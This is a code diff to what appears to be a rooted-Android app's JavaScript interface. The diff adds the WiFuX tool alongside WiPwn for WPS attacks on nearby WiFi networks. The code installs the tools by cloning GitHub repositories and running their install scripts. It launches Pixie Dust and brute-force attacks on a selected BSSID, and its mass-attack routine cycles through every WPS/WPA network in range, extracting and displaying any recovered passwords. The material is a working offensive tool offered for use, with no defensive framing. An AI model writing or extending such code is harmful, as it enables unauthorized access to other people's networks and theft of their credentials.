@@ -14,6 +14,7 @@ let currentDNS = null;
 let wifiBoosted = false;
 let showOnlyFree5GHz = false;
 let logInterval = null;
+let currentAttackTool = 'wipwn'; 
 
 const DNS_PROVIDERS = {
     'Cloudflare (Fast & Private)': '1dot1dot1dot1.cloudflare-dns.com',
@@ -446,6 +447,7 @@ async function setGlobalDNS(providerName) {
         if (dnsSelect) dnsSelect.disabled = false;
     }
 }
+
 // --- WiFi Attack Functions ---
 
 // Helper to safely encode Unicode strings to Base64 for shell execution
@@ -492,14 +494,14 @@ ${command} ${redirection}
     const writeCmd = `echo "${b64Script}" | base64 -d > ${scriptPath} && chmod 777 ${scriptPath}`;
     await execFn(`su -c "${writeCmd}"`);
     
-    // ✅ Execute the script AS THE TERMUX USER (not root)
+    // ✅ Execute the script AS THE TERMUX USER (not root)    
     const markerArg = jobMarker ? jobMarker : "";
     const execCmd = `su -c "su ${user} -c 'nohup ${scriptPath} ${markerArg} > /dev/null 2>&1 &'"`;
-    
-    return await execFn(execCmd);
+        return await execFn(execCmd);
 }
 
-async function checkTermuxInstalled() {    try {
+async function checkTermuxInstalled() {    
+    try {
         const res = await execFn('su -c "pm path com.termux"');
         return res.includes('package:');
     } catch (e) { return false; }
@@ -508,6 +510,15 @@ async function checkTermuxInstalled() {    try {
 async function checkWipwnInstalled() {
     try {
         const res = await execFn('su -c "test -f /data/data/com.termux/files/home/wipwn/main.py && echo yes || echo no"');
+        return res.trim() === 'yes';
+    } catch (e) { return false; }
+}
+
+// ✅ UPDATED: Robust check for WiFuX (checks for main.py in both WiFuX and wifux directories)
+async function checkWifuxInstalled() {
+    try {
+        // Directly checks if the main.py file exists, which is what the attack command actually runs
+        const res = await execFn('su -c "test -f /data/data/com.termux/files/home/WiFuX/main.py && echo yes || (test -f /data/data/com.termux/files/home/wifux/main.py && echo yes || echo no)"');
         return res.trim() === 'yes';
     } catch (e) { return false; }
 }
@@ -532,12 +543,10 @@ function startLogReader(logFile, elementId) {
 }
 
 function stopLogReader() {
-    if (logInterval) {
-        clearInterval(logInterval);
+    if (logInterval) {        clearInterval(logInterval);
         logInterval = null;
     }
 }
-
 async function showAttackModal(network) {
     const existing = document.getElementById('attack-modal');
     if (existing) existing.remove();
@@ -582,53 +591,110 @@ async function showAttackModal(network) {
     modal.onclick = e => { if (e.target === modal) { stopLogReader(); modal.remove(); } };
     document.body.appendChild(modal);
 
-    const termuxInstalled = await checkTermuxInstalled();
-if (!termuxInstalled) { 
-    content.innerHTML = `
-         <div style="text-align: center; padding: 20px;">
-             <div style="font-size: 48px; margin-bottom: 16px;">📦</div>
-             <div style="color: #FF9F0A; font-size: 16px; font-weight: 600; margin-bottom: 12px;">Termux Not Installed</div>
-             <div style="color: #8b92b4; font-size: 14px; margin-bottom: 20px;">To perform WiFi attacks, you need to install Termux first.</div>
-             <a href="https://github.com/termux/termux-app/releases/download/v0.118.3/termux-app_v0.118.3+github-debug_universal.apk" target="_blank" style="display: inline-block; padding: 12px 24px; background: linear-gradient(135deg, #4a9eff, #2980b9); color: #fff; text-decoration: none; border-radius: 10px; font-weight: 600; margin-bottom: 16px;">
-                 📥 Download Termux APK
-             </a>
-             <div style="color: #8b92b4; font-size: 12px; margin-top: 16px;">
-                 After installing, open Termux, type <code style="background:#2a3152; padding:2px 6px; border-radius:4px;">su</code> and grant root access.
+    const termuxInstalled = await checkTermuxInstalled();    
+    if (!termuxInstalled) { 
+        content.innerHTML = `
+             <div style="text-align: center; padding: 20px;">
+                 <div style="font-size: 48px; margin-bottom: 16px;">📦</div>                 <div style="color: #FF9F0A; font-size: 16px; font-weight: 600; margin-bottom: 12px;">Termux Not Installed</div>
+                 <div style="color: #8b92b4; font-size: 14px; margin-bottom: 20px;">To perform WiFi attacks, you need to install Termux first.</div>
+                 <a href="https://github.com/termux/termux-app/releases/download/v0.118.3/termux-app_v0.118.3+github-debug_universal.apk" target="_blank" style="display: inline-block; padding: 12px 24px; background: linear-gradient(135deg, #4a9eff, #2980b9); color: #fff; text-decoration: none; border-radius: 10px; font-weight: 600; margin-bottom: 16px;">
+                     📥 Download Termux APK
+                 </a>
+                 <div style="color: #8b92b4; font-size: 12px; margin-top: 16px;">
+                     After installing, open Termux, type <code style="background:#2a3152; padding:2px 6px; border-radius:4px;">su</code> and grant root access.
+                 </div>
              </div>
-         </div>
-    `;
-    return;
-}
+        `;
+        return;
+    }
     
     const wipwnInstalled = await checkWipwnInstalled();
-    if (!wipwnInstalled) {
+    const wifuxInstalled = await checkWifuxInstalled();
+
+    // ✅ UPDATED: Show setup for both if NEITHER is installed
+    if (!wipwnInstalled && !wifuxInstalled) {
         content.innerHTML = `
-            <div style="text-align: center; padding: 20px;">                <div style="font-size: 48px; margin-bottom: 16px;">⚙️</div>
-                <div style="color: #4a9eff; font-size: 16px; font-weight: 600; margin-bottom: 12px;">Setup Required/grant termux as root</div>
-                <button id="setup-wipwn-btn" style="padding: 12px 24px; background: linear-gradient(135deg, #32D74B, #28a745); color: #fff; border: none; border-radius: 10px; font-weight: 600; cursor: pointer; font-size: 14px;">Click for Wifi attack resources</button>
+            <div style="text-align: center; padding: 20px;">
+                <div style="font-size: 48px; margin-bottom: 16px;">⚙️</div>
+                <div style="color: #4a9eff; font-size: 16px; font-weight: 600; margin-bottom: 12px;">Setup Required / Grant Termux Root</div>
+                <div style="color: #8b92b4; font-size: 13px; margin-bottom: 20px;">Choose a tool to install:</div>
+                <div style="display: flex; flex-direction: column; gap: 12px;">
+                    <button id="setup-wipwn-btn" style="padding: 12px 24px; background: linear-gradient(135deg, #32D74B, #28a745); color: #fff; border: none; border-radius: 10px; font-weight: 600; cursor: pointer; font-size: 14px;">⚙️ Setup WiPwn</button>
+                    <button id="setup-wifux-btn" style="padding: 12px 24px; background: linear-gradient(135deg, #9b59b6, #8e44ad); color: #fff; border: none; border-radius: 10px; font-weight: 600; cursor: pointer; font-size: 14px;">🛠️ Setup WiFuX</button>
+                </div>
             </div>
         `;
-        document.getElementById('setup-wipwn-btn').onclick = () => runSetup(network);
+        document.getElementById('setup-wipwn-btn').onclick = () => runSetup(network, 'wipwn');
+        document.getElementById('setup-wifux-btn').onclick = () => runSetup(network, 'wifux');
         return;
     }
 
+    // Auto-select if only one is installed
+    if (wipwnInstalled && !wifuxInstalled) currentAttackTool = 'wipwn';
+    if (!wipwnInstalled && wifuxInstalled) currentAttackTool = 'wifux';
+
+    // ✅ Tool selector UI if BOTH are installed
+    let toolSelectorHtml = '';
+    if (wipwnInstalled && wifuxInstalled) {
+        toolSelectorHtml = `
+            <div style="margin-bottom: 15px; display: flex; justify-content: center; gap: 10px;">
+                <button id="tool-wipwn" style="padding: 8px 16px; background: ${currentAttackTool === 'wipwn' ? '#32D74B' : '#2a3152'}; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-weight: 600;">WiPwn</button>
+                <button id="tool-wifux" style="padding: 8px 16px; background: ${currentAttackTool === 'wifux' ? '#9b59b6' : '#2a3152'}; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-weight: 600;">WiFuX</button>
+            </div>        `;
+    }
+
+    // ✅ NEW: Add "Install Missing Tool" button if only one is installed
+    let installMissingHtml = '';    if (wipwnInstalled && !wifuxInstalled) {
+        installMissingHtml = `
+            <div style="margin-bottom: 15px; text-align: center;">
+                <button id="install-wifux-btn" style="padding: 8px 16px; background: #2a3152; border: 1px solid #9b59b6; color: #9b59b6; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 12px;"> Install WiFuX</button>
+            </div>
+        `;
+    } else if (!wipwnInstalled && wifuxInstalled) {
+        installMissingHtml = `
+            <div style="margin-bottom: 15px; text-align: center;">
+                <button id="install-wipwn-btn" style="padding: 8px 16px; background: #2a3152; border: 1px solid #32D74B; color: #32D74B; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 12px;">📥 Install WiPwn</button>
+            </div>
+        `;
+    }
+
     content.innerHTML = `
+        ${toolSelectorHtml}
+        ${installMissingHtml}
         <div style="text-align: center; padding: 20px;">
             <div style="font-size: 48px; margin-bottom: 16px;">🎯</div>
-            <div style="color: #32D74B; font-size: 16px; font-weight: 600; margin-bottom: 12px;">Ready to Attack</div>
+            <div style="color: #32D74B; font-size: 16px; font-weight: 600; margin-bottom: 12px;">Ready to Attack (${currentAttackTool === 'wipwn' ? 'WiPwn' : 'WiFuX'})</div>
             <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
                 <button id="pixie-btn" style="padding: 16px; background: linear-gradient(135deg, #9b59b6, #8e44ad); color: #fff; border: none; border-radius: 12px; font-weight: 600; cursor: pointer;">✨ Pixie Dust</button>
                 <button id="brute-btn" style="padding: 16px; background: linear-gradient(135deg, #FF9F0A, #ff7f50); color: #fff; border: none; border-radius: 12px; font-weight: 600; cursor: pointer;">🔨 Brute Force</button>
             </div>
         </div>
     `;
+
+    // Bind tool selector events if both are installed
+    if (wipwnInstalled && wifuxInstalled) {
+        document.getElementById('tool-wipwn').onclick = () => { currentAttackTool = 'wipwn'; showAttackModal(network); };
+        document.getElementById('tool-wifux').onclick = () => { currentAttackTool = 'wifux'; showAttackModal(network); };
+    }
+
+    // ✅ Bind install missing tool buttons
+    if (wipwnInstalled && !wifuxInstalled) {
+        document.getElementById('install-wifux-btn').onclick = () => runSetup(network, 'wifux');
+    } else if (!wipwnInstalled && wifuxInstalled) {
+        document.getElementById('install-wipwn-btn').onclick = () => runSetup(network, 'wipwn');
+    }
+
     document.getElementById('pixie-btn').onclick = () => startAttack(network, 'pixie');
     document.getElementById('brute-btn').onclick = () => startAttack(network, 'brute');
 }
 
-async function runSetup(network) {
-    if (await checkWipwnInstalled()) {
-        if (typeof showStatus === 'function') showStatus('✅ WiPwn already installed!', '#32D74B');
+// ✅ UPDATED: Accepts 'tool' parameter to run correct setup
+async function runSetup(network, tool = 'wipwn') {
+    const isWipwn = tool === 'wipwn';
+    const isInstalled = isWipwn ? await checkWipwnInstalled() : await checkWifuxInstalled();
+    
+    if (isInstalled) {        if (typeof showStatus === 'function') showStatus(`✅ ${isWipwn ? 'WiPwn' : 'WiFuX'} already installed!`, '#32D74B');
+        currentAttackTool = tool;
         showAttackModal(network);
         return;
     }
@@ -639,9 +705,15 @@ async function runSetup(network) {
     
     logContainer.style.display = 'block';
     stopBtn.style.display = 'block';    
-    content.innerHTML = '<div style="color: #4a9eff; text-align: center; padding: 10px;">⏳ Opening Termux to setup WiPwn...</div>';
+    content.innerHTML = `<div style="color: #4a9eff; text-align: center; padding: 10px;">⏳ Opening Termux to setup ${isWipwn ? 'WiPwn' : 'WiFuX'}...</div>`;
 
-    const setupCmd = `pkg update && pkg upgrade -y && pkg install root-repo -y && pkg install git python wpa-supplicant pixiewps iw openssl -y && pkg install tsu -y || pkg install sudo -y && git clone https://github.com/anbuinfosec/wipwn && cd wipwn && chmod +x main.py`;
+    let setupCmd = '';
+    if (isWipwn) {
+        // EXACT ORIGINAL WIPWN LOGIC
+        setupCmd = `pkg update && pkg upgrade -y && pkg install root-repo -y && pkg install git python wpa-supplicant pixiewps iw openssl -y && pkg install tsu -y || pkg install sudo -y && git clone https://github.com/anbuinfosec/wipwn && cd wipwn && chmod +x main.py`;
+    } else {        // ✅ WIFUX SETUP LOGIC
+        setupCmd = `pkg update && pkg upgrade -y && pkg install root-repo git tsu python wpa-supplicant pixiewps iw -y && git clone https://github.com/msrofficial/WiFuX && cd WiFuX && chmod +x install.sh && bash install.sh`;
+    }
 
     // Launch Termux and auto-paste the command
     const launchCmd = `
@@ -663,20 +735,31 @@ async function runSetup(network) {
     };
 
     const checkInterval = setInterval(async () => {
-        const status = await execFn('su -c "cat /sdcard/MTK_AI_Engine/wifi/wipwn_status 2>/dev/null"');
-        if (status.trim() === 'SETUP_COMPLETE') {
+        let isReady = false;
+        if (isWipwn) {
+            // Original WiPwn logic
+            const status = await execFn('su -c "cat /sdcard/MTK_AI_Engine/wifi/wipwn_status 2>/dev/null"');
+            if (status.trim() === 'SETUP_COMPLETE') isReady = true;
+            // Fallback to actual check in case status file isn't written
+            if (await checkWipwnInstalled()) isReady = true; 
+        } else {            // WiFuX logic (now uses the robust main.py check)
+            if (await checkWifuxInstalled()) isReady = true;
+        }
+
+        if (isReady) {
             clearInterval(checkInterval);
             stopLogReader();
             stopBtn.style.display = 'none';
-            if (typeof showStatus === 'function') showStatus('✅ Setup complete!', '#32D74B');
+            if (typeof showStatus === 'function') showStatus(`✅ ${isWipwn ? 'WiPwn' : 'WiFuX'} setup complete!`, '#32D74B');
+            currentAttackTool = tool;
             showAttackModal(network);
         }
     }, 2000);
- }
+}
 
+// ✅ UPDATED: Uses currentAttackTool to run correct attack command
 async function startAttack(network, type) {
-    if (!network.bssid) {
-        if (typeof showStatus === 'function') showStatus('❌ MAC address not found', '#FF3B30');
+    if (!network.bssid) {        if (typeof showStatus === 'function') showStatus('❌ MAC address not found', '#FF3B30');
         return;
     }
 
@@ -689,7 +772,8 @@ async function startAttack(network, type) {
     stopBtn.style.display = 'block';
     
     const attackType = type === 'pixie' ? 'Pixie Dust' : 'Brute Force';
-    content.innerHTML = `<div style="color: #32D74B; text-align: center; padding: 10px;">⚔️ Starting ${attackType} attack...</div>`;
+    const toolName = currentAttackTool === 'wipwn' ? 'WiPwn' : 'WiFuX';
+    content.innerHTML = `<div style="color: #32D74B; text-align: center; padding: 10px;">⚔️ Starting ${attackType} with ${toolName}...</div>`;
 
     const macUpper = network.bssid.toUpperCase();
     const attackArg = type === 'pixie' ? '-K' : '-B';
@@ -698,24 +782,34 @@ async function startAttack(network, type) {
     await execFn('cmd wifi start-softap MyHotspot open ""');
     await execFn('su -c "echo \\"\\" > /sdcard/MTK_AI_Engine/wifi/wipwn.log"');
 
-    const attackShellCmd = `cd ~/wipwn && sudo python3 -u main.py -i wlan0 -b ${macUpper} ${attackArg}`;
-    await runTermuxCommand(attackShellCmd, '/sdcard/MTK_AI_Engine/wifi/wipwn.log', attackJobId);
+    let attackShellCmd = '';
+    if (currentAttackTool === 'wipwn') {
+        // EXACT ORIGINAL WIPWN LOGIC
+        attackShellCmd = `cd ~/wipwn && sudo python3 -u main.py -i wlan0 -b ${macUpper} ${attackArg}`;
+    } else {
+        // ✅ WIFUX ATTACK LOGIC
+        attackShellCmd = `cd ~/WiFuX && timeout 999999 sudo python -u main.py -i wlan0 -b ${macUpper} ${attackArg}`;
+    }
+
+    await runTermuxCommand(attackShellCmd, '/sdcard/MTK_AI_Engine/wifi/wipwn.log', attackJobId);    await execFn('svc wifi disable');
     await execFn('nohup sh /sdcard/MTK_AI_Engine/wifi/termux_script.sh &');
     startLogReader('/sdcard/MTK_AI_Engine/wifi/wipwn.log', 'attack-log');
-
+    
     stopBtn.onclick = async () => {
         await execFn(`su -c "pkill -f ${attackJobId} || true"`);
         await execFn('cmd wifi stop-softap');
         await execFn('svc wifi enable');
         await execFn(`su -c "pkill -f termux_script.sh || true"`);
         await execFn(`su -c "pkill -9 -f /data/data/com.termux || true"`);
-        stopLogReader();        stopBtn.style.display = 'none';
+        stopLogReader();        
+        stopBtn.style.display = 'none';
         content.innerHTML = `<div style="color: #FF9F0A; text-align: center; padding: 10px;">⏹️ Attack stopped.</div>`;
     };
 }
 
-async function attackAllNetworks() {
-    if (availableNetworks.length === 0) {
+// ✅ UPDATED: Mass attack now supports both tools
+async function attackAllNetworks() {    
+if (availableNetworks.length === 0) {
         if (typeof showStatus === 'function') showStatus('❌ No networks to attack. Scan first!', '#FF3B30');
         return;
     }
@@ -727,10 +821,16 @@ async function attackAllNetworks() {
     }
 
     const wipwnInstalled = await checkWipwnInstalled();
-    if (!wipwnInstalled) {
-        if (typeof showStatus === 'function') showStatus('❌ WiPwn not installed. Setup first!', '#FF3B30');
+    const wifuxInstalled = await checkWifuxInstalled();
+
+    if (!wipwnInstalled && !wifuxInstalled) {
+        if (typeof showStatus === 'function') showStatus('❌ No attack tool installed. Setup first!', '#FF3B30');
         return;
     }
+
+    // Fallback if selected tool is not installed
+    if (currentAttackTool === 'wipwn' && !wipwnInstalled) currentAttackTool = 'wifux';
+    if (currentAttackTool === 'wifux' && !wifuxInstalled) currentAttackTool = 'wipwn';
 
     // Filter networks that have WPS/WPA (required for Pixie Dust)
     const targetNetworks = availableNetworks.filter(n => 
@@ -741,7 +841,6 @@ async function attackAllNetworks() {
         if (typeof showStatus === 'function') showStatus('❌ No WPS/WPA networks found', '#FF3B30');
         return;
     }
-
     // Create attack progress modal
     const existingModal = document.getElementById('attack-all-modal');
     if (existingModal) existingModal.remove();
@@ -754,16 +853,16 @@ async function attackAllNetworks() {
     box.style.cssText = `background: #1a1f3a; border: 1px solid #2a3152; border-radius: 16px; padding: 24px; width: 90%; max-width: 650px; max-height: 90vh; overflow-y: auto; box-shadow: 0 10px 40px rgba(0,0,0,0.5);`;
 
     box.innerHTML = `
-        <h3 style="color: #fff; margin: 0 0 16px; font-size: 18px; font-weight: 600; text-align: center;">⚔️ Mass Pixie Dust Attack</h3>
+        <h3 style="color: #fff; margin: 0 0 16px; font-size: 18px; font-weight: 600; text-align: center;">⚔️ Mass Pixie Dust Attack (${currentAttackTool === 'wipwn' ? 'WiPwn' : 'WiFuX'})</h3>
         <div style="color: #8b92b4; font-size: 13px; margin-bottom: 16px; text-align: center;">
             Targeting <strong style="color: #4a9eff">${targetNetworks.length}</strong> networks • 30s per target
         </div>
-        <div style="margin-bottom: 20px;">
-            <div style="display: flex; justify-content: space-between; margin-bottom: 8px; color: #8b92b4; font-size: 12px;">
+        <div style="margin-bottom: 20px;">            <div style="display: flex; justify-content: space-between; margin-bottom: 8px; color: #8b92b4; font-size: 12px;">
                 <span id="attack-progress-text">Initializing...</span>
                 <span id="attack-current-target">0/${targetNetworks.length}</span>
             </div>
-            <div style="background: #151b2d; border-radius: 8px; height: 8px; overflow: hidden;">                <div id="attack-progress-bar" style="background: linear-gradient(90deg, #FF3B30, #ff7f50); height: 100%; width: 0%; transition: width 0.3s ease;"></div>
+            <div style="background: #151b2d; border-radius: 8px; height: 8px; overflow: hidden;">                
+                <div id="attack-progress-bar" style="background: linear-gradient(90deg, #FF3B30, #ff7f50); height: 100%; width: 0%; transition: width 0.3s ease;"></div>
             </div>
         </div>
         <div id="current-target-info" style="background: #151b2d; padding: 12px; border-radius: 8px; margin-bottom: 16px; border-left: 3px solid #4a9eff;">
@@ -790,8 +889,7 @@ async function attackAllNetworks() {
     const results = [];
 
     document.getElementById('stop-all-attack-btn').onclick = async () => {
-        attackStopped = true;
-        await execFn('su -c "pkill -f MASS_ATTACK || true"');
+        attackStopped = true;        await execFn('su -c "pkill -f MASS_ATTACK || true"');
         await execFn('cmd wifi stop-softap');
         await execFn('svc wifi enable');
         await execFn('su -c "pkill -f termux_script.sh || true"');
@@ -807,13 +905,13 @@ async function attackAllNetworks() {
     // Loop through each target network
     for (let i = 0; i < targetNetworks.length; i++) {
         if (attackStopped || passwordFound) break;
-
         const network = targetNetworks[i];
         const macUpper = network.bssid.toUpperCase();
         
         // Update UI progress
         const progress = ((i + 1) / targetNetworks.length) * 100;
-        document.getElementById('attack-progress-bar').style.width = `${progress}%`;        document.getElementById('attack-progress-text').textContent = `Attacking: ${network.ssid}`;
+        document.getElementById('attack-progress-bar').style.width = `${progress}%`;        
+        document.getElementById('attack-progress-text').textContent = `Attacking: ${network.ssid}`;
         document.getElementById('attack-current-target').textContent = `${i + 1}/${targetNetworks.length}`;
         
         document.getElementById('current-target-info').innerHTML = `
@@ -828,12 +926,19 @@ async function attackAllNetworks() {
         await execFn('cmd wifi start-softap MyHotspot open ""');
         await execFn('su -c "echo \\"\\" > /sdcard/MTK_AI_Engine/wifi/wipwn.log"');
 
-        // Added timeout 30 to the shell command to auto-kill after 30s
-        const attackShellCmd = `cd ~/wipwn && timeout 30 sudo python3 -u main.py -i wlan0 -b ${macUpper} -K`;
-        await runTermuxCommand(attackShellCmd, '/sdcard/MTK_AI_Engine/wifi/wipwn.log', attackJobId);
-        await execFn('nohup sh /sdcard/MTK_AI_Engine/wifi/termux_script.sh &');
-        startLogReader('/sdcard/MTK_AI_Engine/wifi/wipwn.log', 'attack-all-log');
+        let attackShellCmd = '';
+        if (currentAttackTool === 'wipwn') {
+            // EXACT ORIGINAL WIPWN LOGIC
+            attackShellCmd = `cd ~/wipwn && timeout 30 sudo python3 -u main.py -i wlan0 -b ${macUpper} -K`;
+        } else {
+            // ✅ WIFUX MASS ATTACK LOGIC
+            attackShellCmd = `cd ~/WiFuX && timeout 30 sudo python -u main.py -i wlan0 -b ${macUpper} -K`;
+        }
 
+        await runTermuxCommand(attackShellCmd, '/sdcard/MTK_AI_Engine/wifi/wipwn.log', attackJobId);
+        await execFn('svc wifi disable');
+        await execFn('nohup sh /sdcard/MTK_AI_Engine/wifi/termux_script.sh &');
+        startLogReader('/sdcard/MTK_AI_Engine/wifi/wipwn.log', 'attack-all-log');        
         // Wait for 30 seconds (plus 2s buffer to ensure logs are fully written)
         await new Promise(resolve => setTimeout(resolve, 32000));
 
@@ -849,7 +954,6 @@ async function attackAllNetworks() {
         
         const passwordMatch = logContent.match(/WPA PSK:\s*([^\s\n]+)/i) || 
                              logContent.match(/Password:\s*([^\s\n]+)/i);
-
         if (passwordMatch && passwordMatch[1] && passwordMatch[1].length > 0) {
             passwordFound = true;
             const password = passwordMatch[1].trim();
@@ -861,7 +965,8 @@ async function attackAllNetworks() {
 
             document.getElementById('current-target-info').innerHTML = `
                 <div style="color: #32D74B; font-weight: 600; margin-bottom: 4px;">✅ PASSWORD FOUND!</div>
-                <div style="color: #fff; font-size: 13px; margin: 8px 0; padding: 8px; background: #1a2f1a; border-radius: 6px;">                    <strong>SSID:</strong> ${network.ssid}<br>
+                <div style="color: #fff; font-size: 13px; margin: 8px 0; padding: 8px; background: #1a2f1a; border-radius: 6px;">
+                    <strong>SSID:</strong> ${network.ssid}<br>
                     <strong>Password:</strong> <span style="color: #32D74B; font-family: monospace;">${password}</span>
                 </div>
                 <div style="color: #32D74B; font-size: 12px;">⏹️ Stopping all attacks...</div>
@@ -882,8 +987,7 @@ async function attackAllNetworks() {
     // Show results summary
     if (results.length > 0) {
         document.getElementById('attack-all-results').style.display = 'block';
-        const resultsList = document.getElementById('attack-all-results-list');
-        const successCount = results.filter(r => r.status === 'SUCCESS').length;
+        const resultsList = document.getElementById('attack-all-results-list');        const successCount = results.filter(r => r.status === 'SUCCESS').length;
         const failedCount = results.filter(r => r.status === 'FAILED').length;
         
         let resultsHtml = `
@@ -898,8 +1002,7 @@ async function attackAllNetworks() {
                 resultsHtml += `
                     <div style="padding: 8px; margin-bottom: 8px; background: #1a2f1a; border-left: 3px solid #32D74B; border-radius: 4px;">
                         <div style="color: #32D74B; font-weight: 600; font-size: 12px;">✅ ${result.ssid}</div>
-                        <div style="color: #fff; font-family: monospace; font-size: 11px; margin-top: 4px; padding: 4px; background: #0d1f0d; border-radius: 4px;">${result.password}</div>
-                    </div>
+                        <div style="color: #fff; font-family: monospace; font-size: 11px; margin-top: 4px; padding: 4px; background: #0d1f0d; border-radius: 4px;">${result.password}</div>                    </div>
                 `;
             } else {
                 resultsHtml += `
